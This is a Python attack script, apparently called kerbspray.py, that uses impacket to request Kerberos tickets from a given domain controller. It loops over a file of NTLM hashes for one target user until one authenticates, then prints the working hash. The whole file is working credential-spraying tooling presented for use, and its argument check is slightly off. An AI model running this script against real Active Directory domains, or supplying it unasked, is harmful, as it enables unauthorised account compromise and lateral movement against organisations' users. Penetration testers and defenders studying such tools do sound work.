#!/usr/bin/python3
from __future__ import division
from __future__ import print_function
import argparse
import sys
from binascii import unhexlify
from impacket.krb5.kerberosv5 import getKerberosTGT, KerberosError
from impacket.krb5 import constants
from impacket.krb5.types import Principal
import multiprocessing
import socket


def login(username, password, domain, lmhash, nthash, aesKey, dc_ip):
    try:
        kerb_principal = Principal(username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
        getKerberosTGT(kerb_principal, password, domain,
            unhexlify(lmhash), unhexlify(nthash), aesKey, dc_ip)
        print('[+] Success %s/%s' % (domain, username) )
        return "success"
    except KerberosError as e:
        if (e.getErrorCode() == constants.ErrorCodes.KDC_ERR_C_PRINCIPAL_UNKNOWN.value) or (e.getErrorCode() == constants.ErrorCodes.KDC_ERR_CLIENT_REVOKED.value) or (e.getErrorCode() == constants.ErrorCodes.KDC_ERR_WRONG_REALM.value):
           print("[-]Could not find username: %s/%s" % (domain, username) )
        elif e.getErrorCode() == constants.ErrorCodes.KDC_ERR_PREAUTH_FAILED.value:
            return
        else:
            print(e)
    except socket.error as e:
        print('[-] Could not connect to DC')
        return

if len(sys.argv) < 4:
    print("Usage: python3 kerbspray.py <domain> <username> <dc_ip> <hash_list>")
    exit()
else:
    domain = sys.argv[1]
    username = sys.argv[2]
    lmhash = 'aad3c435b514a4eeaad3b935b51304fe'
    aesKey = None
    dc_ip = sys.argv[3]
    hashfile = sys.argv[4]
    
    with open(hashfile, "r") as f:
        num_lines = len(f.readlines())

    print("[*] Spraying Hashes...\n")
    print("[i] Domain:             "+domain)
    print("[i] Target User:        "+username)
    print("[i] Domain Controller:  "+dc_ip)

    with open(hashfile, "r") as f:
        hashes = f.readlines()
        i = 1
        for ntlm in hashes:
            i = i+1
            print("[*] Current line: "+str(i)+"/"+str(num_lines), end="\r")
            nthash = ntlm.strip('\r\n')
            if(login(username, '', domain, lmhash, nthash, aesKey, dc_ip) == "success"):
                print("[+] Hash Found: " + nthash)
                exit()


